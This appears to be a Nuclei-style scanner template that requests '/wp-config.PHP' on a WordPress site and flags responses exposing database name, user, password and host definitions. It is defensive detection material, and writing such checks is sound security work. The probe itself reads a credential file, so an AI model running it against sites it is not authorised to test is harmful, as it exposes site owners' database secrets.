id: wordpress-source-code-disclosure

info:
  name: Wordpress Source Code Disclosure
  author: rix4uni
  severity: high
  description: description
  reference:
    - https://twitter.com/exploit_msf/status/1666717458676301824
  tags: wordpress,disclosure,wp,exposure

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-config.PHP"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "define('DB_NAME'"
          - "define('DB_USER'"
          - "define('DB_PASSWORD'"
          - "define('DB_HOST'"
          - "define('DB_CHARSET'"
          - "define('DB_COLLATE'"
          - "define('WP_HOME'"
          - "define('WP_SITEURL'"

      - type: status
        status:
          - 200